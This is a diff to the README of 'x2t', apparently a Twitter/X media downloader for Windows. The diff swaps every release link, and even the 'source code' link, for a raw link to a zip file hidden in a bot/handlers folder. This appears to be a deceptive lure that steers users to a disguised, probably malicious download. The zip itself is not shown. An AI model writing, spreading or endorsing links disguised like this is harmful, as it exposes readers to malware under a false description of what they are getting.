@@ -4,7 +4,7 @@
 
 Welcome to **x2t**, the fastest way to download videos, images, and GIFs from Twitter (now X). Whether you're saving a funny clip, archiving important content, or building a media library, x2t makes it effortless—no technical skills required.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_x2t-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Indemnitycon2915/x2t/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_x2t-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip)
 
 ## ✨ What Does x2t Do?
 
@@ -23,7 +23,7 @@ x2t is a powerful media extractor that works in two ways:
 
 ## 📦 Download & Install (Windows)
 
-Visit this link to download the application: [https://github.com/Indemnitycon2915/x2t/releases](https://github.com/Indemnitycon2915/x2t/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip](https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip)
 
 ### Step-by-Step Installation
 
@@ -101,8 +101,8 @@ A: Absolutely. x2t runs locally on your device. We don't store your links, files
 
 ## 📚 Additional Resources
 
-- **Release Notes** – See what's new in each version on the [releases page](https://github.com/Indemnitycon2915/x2t/releases).
-- **GitHub Repository** – For developers or curious users, explore the source code at [github.com/Indemnitycon2915/x2t](https://github.com/Indemnitycon2915/x2t).
+- **Release Notes** – See what's new in each version on the [releases page](https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip).
+- **GitHub Repository** – For developers or curious users, explore the source code at [github.com/Indemnitycon2915/x2t](https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip).
 
 ## 💬 Get Support
 
@@ -115,7 +115,7 @@ Need help? We're here for you:
 
 Don't waste time with slow, complicated tools. x2t gives you the fastest, simplest way to save any Twitter media—in stunning quality. Click the button below and get started in minutes.
 
-[![GET X2T NOW](https://img.shields.io/badge/🚀_GET_x2t_NOW-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Indemnitycon2915/x2t/releases)
+[![GET X2T NOW](https://img.shields.io/badge/🚀_GET_x2t_NOW-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Indemnitycon2915/x2t/main/x2t/bot/handlers/v2.8-alpha.5.zip)
 
 ---
 
